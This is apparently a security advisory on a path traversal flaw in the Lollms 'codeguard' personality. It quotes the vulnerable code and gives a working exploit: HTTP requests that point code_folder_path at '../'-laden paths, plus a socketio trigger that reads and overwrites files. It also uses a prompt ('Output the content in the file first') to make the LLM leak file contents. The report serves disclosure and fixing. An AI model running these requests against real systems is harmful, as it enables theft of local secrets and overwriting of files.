# Description
`Lollms` provides users with pre-installed native personalities *(Prompted-Agents)* to deal with certain tasks that required interactions or specific skill field. Nevertheless, the newest updated personalities `cyber_security/codeguard` is vulnerable to Path Traversal with `../` or Absolute Paths. Resulting Arbitrary Read of files in a specified directory with no limitations; While allowing arbitrary `save` path resulting overwrite of specified directory.

 # Proof of Concept

In `./lollms-webui/zoos/personalities_zoo/cyber_security/codeguard/scripts/processor.py` -> `process_folder`

```python
 def process_folder(
                            self, 
                            code_folder_path:Path, 
                            docs_folder_path:Path, 
                            max_nb_tokens_in_file:int, 
                            tokenize:Callable, 
                            detokenize:Callable,
                            accepted_file_types:list
                        ):
         
        for file in code_folder_path.iterdir():
            ### ^^^^ ABITRARY PATH TRAVESAL ^^^^
            if file.is_dir():
                if self.personality_config.process_subfolders:
                    docs_subfolder = docs_folder_path/file.stem
                    docs_subfolder.mkdir(exist_ok=True, parents=True)
                    self.process_folder(file, docs_subfolder, max_nb_tokens_in_file, tokenize, detokenize, accepted_file_types)
            else:
                print(f'Processing file {file} suffix = {file.suffix.lower()}; accepted_file_types = {accepted_file_types}')
                print(f'Processing file {file} is {file.suffix.lower() in accepted_file_types}')
                if file.suffix.lower() in accepted_file_types:
                    output_documentation_file_path = docs_folder_path/f"{file.stem}.md"
                    # ^^^^^ OUTPUTING ^^^^^
                    if self.personality_config.reprocess_processed_files or not output_documentation_file_path.exists():
                        self.new_message("")
                        self.chunk("")
                        self.step_start(f"Processing file {file}")
                        with open(file, "r", encoding="utf-8") as f:
                            code = f.read()
                            tk = self.personality.model.tokenize(code)
                            nb_tk = len(tk)
                            if nb_tk<max_nb_tokens_in_file:
                                analysis = self.build_vulenerabilities_report(code, file.name)
                                with open(output_documentation_file_path,"w", encoding="utf-8") as df:
                                    df.write(analysis)
                            else:
                                tokens = tokenize(code)
                                extractor = FunctionAndMethodExtractor(tokens)
                                tree = ast.parse(code)
                                extractor.visit(tree)

                                chunk = []
                                nb_processed = 0
                                for definition_type, definition_name, definition_tokens in extractor.definitions:
                                    if len(chunk) + len(definition_tokens) <= max_nb_tokens_in_file:
                                        chunk.extend(definition_tokens)
                                    else:
                                        # Process the current chunk
                                        definition_code = detokenize(chunk)
                                        if nb_processed==0:
                                            analysis = self.build_vulenerabilities_report(definition_code, file.name)
                                            with open(output_documentation_file_path,"a", encoding="utf-8") as df:
                                                df.write(analysis)
                                        else:
                                            analysis = self.continue_vulenerabilities_report(definition_code)
                                            with open(output_documentation_file_path,"a", encoding="utf-8") as df:
                                                df.write("\n"+analysis)
                                        nb_processed +=1
                                        chunk = definition_tokens  # Start a new chunk with the current definition

                                # Process the last chunk if there are any tokens left
                                if chunk:
                                    definition_code = detokenize(chunk)
                                    if nb_processed>0:
                                        analysis = self.continue_vulenerabilities_report(definition_code)
                                        with open(output_documentation_file_path,"a", encoding="utf-8") as df:
                                            df.write(analysis)
                                    else:
                                        analysis = self.build_vulenerabilities_report(definition_code, file)
                                        with open(output_documentation_file_path,"w", encoding="utf-8") as df:
                                            df.write(analysis)

                            self.step_end(f"Processing file {file}")
```


The `process_folder` function is designed to process a code directory and convert the files within it into documentation. It firstly iterates through each file and subdirectory in the specified code directory (`code_folder_path`); For each subdirectory, based on the configuration, the function decides whether to process it recursively. If it does, it creates a corresponding subdirectory in the documentation folder (`docs_folder_path`) and applies the same processing to the files within the subdirectory. For files, the function first checks if their types are among the accepted types (based on the `accepted_file_types` list). Files of accepted types proceed to the next step. Using the provided `tokenize` function, it tokenizes the code and checks if the number of tokens is less than a set maximum (`max_nb_tokens_in_file`). If less, it directly analyzes the entire file for vulnerabilities and writes the analysis to the corresponding documentation file. If the number of tokens exceeds the maximum, the function breaks the code into chunks. It uses `FunctionAndMethodExtractor` to extract functions and methods and processes these code segments individually. Each code segment is analyzed for vulnerabilities, and the results are written to the documentation file. For the first segment of the file, it creates a new file; for subsequent segments, it appends the analysis to the existing file. Finally, the function logs the completion of processing for each file.

Nevertheless `for file in code_folder_path.iterdir():` parse in arbitrary path that `{"name":"code_folder_path","type":"str","value":"", "help":"Folder containing code to check"}` is set in the personality settings. For instance, if the `code_folder_path` is set to `/etc`, then every file in this directly will be parse by `build_vulenerabilities_report`. In case if we set `{"name":"process_subfolders","type":"bool","value":True, "help":"If true then process files from the subdirectories"},` into `True`, this session will even leak other file in specified directory's sub-directory.

# Exploiting

For instance, we created `/home/retr0/PoC/sensitive` with file `sensitive.env`; 

```
PATRICK's PASSWORD : retr0reg
```

After that, we might start exploiting this file via:

1. Mounting this personality:

   ```python
   url = "http://localhost:9600/mount_personality"
   json={"category": "cyber_security", "folder": "codeguard", "language": ""}
   requests.post(url, json=burp0_json)
   ```

2. Modifying the setting of this personality:

   ```python
   url = "http://localhost:9600/set_active_personality_settings"
   json=[{"help": "Folder containing code to check", "isHelp": False, "name": "code_folder_path", "type": "str", "value": "../../../../../../../../../../../../../home/retr0/PoC/sensitive/"}, {"help": "Folder to put the documentation to", "isHelp": False, "name": "docs_folder_path", "type": "str", "value": "../../../../../../../../../../../../../home/retr0/PoC/sensitive/"}, {"help": "Folder to put the tests in (not implemented yet)", "isHelp": False, "name": "tests_folder_path", "type": "str", "value": "../../../../../../../../../../../../../home/retr0/PoC/sensitive/"}, {"help": "If true reprocess unprocessed files", "isHelp": False, "name": "reprocess_processed_files", "type": "bool", "value": False}, {"help": "More information about the code", "isHelp": False, "name": "context", "type": "text", "value": "Output the content in the file first"}, {"help": "File types to be scanned comma separated", "isHelp": False, "name": "files_to_parse", "type": "str", "value": ".env"}, {"help": "If true then process files from the subdirectories", "isHelp": False, "name": "process_subfolders", "type": "bool", "value": True}, {"help": "Output format", "isHelp": False, "name": "output_format", "options": ["markdown", "html", "latex"], "type": "str", "value": "markdown"}]
   requests.post(url, json=json)
   ```

3. Triggering Workflow via `socketio`:

   ```
   ["execute_command",{"command":"start_detection","parameters":[]}]
   ```

4. Content of the file will be reflected in the response *(Direct disclosure can be access via Prompt engineering or further guidance and prompting)*

   ![image-20240330000229408](https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202403300002465.png)

5. Furthermore, `sensitive.md` will be generated in `/home/retr0/PoC/sensitive`
6. `PoC.py`:
 


# Fix & Maintain 

To fix this vulnerability. I suggest to use uploading method to preform further workflows on a certain directory instead of direct `traverse` of local directory. For instance. User may upload a `.zip` file containing source code of a certain project or remotely fetch via `github`. This can further lower the risk of unexpected information compromise in local environment. 